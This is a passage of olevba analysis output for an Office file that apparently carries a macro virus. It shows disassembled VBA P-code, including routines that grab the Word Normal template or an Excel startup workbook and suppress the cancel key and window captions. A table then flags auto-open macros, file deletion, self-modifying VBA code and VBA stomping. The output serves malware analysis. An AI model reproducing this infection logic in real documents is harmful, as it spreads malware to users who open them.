' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Tator 
' 	EndIf 
' Line #387:
' 	EndFunc 
' Line #388:
' 	FuncDefn (Sub ShowMe())
' Line #389:
' 	Dim 
' 	VarDefn Maks
' 	VarDefn Min (As Integer)
' Line #390:
' 	OnError (Resume Next) 
' Line #391:
' 	Ld Tator 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #392:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #393:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	St Caption 
' Line #394:
' 	Ld Application 
' 	MemLd New 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	IfBlock 
' Line #395:
' 	LitDI2 0x0001 
' 	St Maks 
' Line #396:
' 	LitStr 0x0001 " "
' 	Ld Application 
' 	MemSt Caption 
' Line #397:
' 	Ld Windows 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveWindow 
' 	Set actWindow 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld Application 
' 	Set actWindow 
' 	EndIf 
' Line #398:
' 	ElseBlock 
' Line #399:
' 	SetStmt 
' 	Ld Application 
' 	Set actWindow 
' Line #400:
' 	LitStr 0x0000 ""
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #401:
' 	LitDI2 0x1029 
' 	UMi 
' 	St Maks 
' Line #402:
' 	EndIfBlock 
' Line #403:
' 	Ld Maks 
' 	Ld Application 
' 	MemSt WindowState 
' Line #404:
' 	Ld Maks 
' 	Ld actWindow 
' 	MemSt WindowState 
' Line #405:
' 	Ld actWindow 
' 	ArgsCall Message 0x0001 
' Line #406:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt StatusBar 
' Line #407:
' 	Ld Caption 
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #408:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt Caption 
' Line #409:
' 	EndIfBlock 
' Line #410:
' 	EndSub 
' Line #411:
' 	FuncDefn (Sub Aplikasi())
' Line #412:
' 	Ld Application 
' 	MemLd New 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Doc 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall Xls 0x0000 
' 	EndIf 
' Line #413:
' 	EndSub 
' Line #414:
' 	FuncDefn (Sub Doc())
' Line #415:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	St TempPath 
' Line #416:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Active 
' Line #417:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Temp 
' Line #418:
' 	EndSub 
' Line #419:
' 	FuncDefn (Sub Xls())
' Line #420:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	Set Active 
' Line #421:
' 	SetStmt 
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	ArgsLd Workbooks 0x0001 
' 	Set Temp 
' Line #422:
' 	Ld Application 
' 	MemLd TemplatesPath 
' 	St TempPath 
' Line #423:
' 	EndSub 
' Line #424:
' Line #425:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Register            |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

